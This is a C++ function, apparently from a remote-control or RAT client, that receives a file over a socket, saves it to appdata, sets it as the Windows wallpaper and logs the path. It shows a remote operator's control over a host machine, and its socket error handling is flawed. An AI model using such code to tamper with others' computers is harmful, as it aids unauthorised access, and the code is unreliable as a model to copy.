void ChangeWallpaper(string fileName)
{
    recv(objSocket, buffer, sizeof(buffer), 0);

    string data;
    int fileSize = atoi(buffer);

    while (data.length() < fileSize) {
        try {
            data.append(buffer, recv(objSocket, buffer, sizeof(buffer), 0));
        
        } catch (exception e) { return; }
    
    } string location = appdata + "/" + fileName;

    FILE* RemoteFile = fopen(location.data(), "wb");
    fwrite(data.data(), 1, data.size(), RemoteFile);
    fclose(RemoteFile);

    SystemParametersInfo
    (
        SPI_SETDESKWALLPAPER,
        0,
        (PVOID)location.data(),
        SPIF_UPDATEINIFILE
    
    ); fileLog.push_back(location);
}